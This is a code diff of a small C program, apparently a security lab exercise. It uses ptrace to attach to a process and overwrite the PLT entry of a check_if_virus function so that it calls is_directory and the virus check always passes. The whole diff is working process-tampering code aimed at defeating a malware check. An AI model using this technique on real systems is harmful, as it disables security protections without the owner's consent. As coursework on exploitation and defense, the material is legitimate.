@@ -7,9 +7,12 @@
 #include <unistd.h>
 
 int pid = 0x12345678;
-#define CHECK_IF_VIRUS_ADDRESS 0xb7fd3750
-#define MY_CODE 0xc3c02990 //nop; sub eax, eax; ret
-
+#define IS_DIRECTORY_ADDRESS 0x804878b
+#define CHECK_IF_VIRUS_PLT_ADDRESS 0x0804a01c
+/*
+ * This time we overwrite the plt entry for check_if_virus so that it will call is_directory instead.
+ * In doing so the call for check_if_virus will always return 0 for a file that exists
+ */
 int main() 
 {
 	if(ptrace(PTRACE_ATTACH, pid, NULL, NULL) == -1)
@@ -20,8 +23,8 @@ int main()
 
 	int status;
 	waitpid(pid, &status, 0);
-	if(WIFEXITED(status)) {return -1;}
-	ptrace(PTRACE_POKETEXT, pid, CHECK_IF_VIRUS_ADDRESS, MY_CODE);
+	if(WIFEXITED(status)) {return -1;} 
+	ptrace(PTRACE_POKETEXT, pid, CHECK_IF_VIRUS_PLT_ADDRESS, IS_DIRECTORY_ADDRESS);
 
 
 
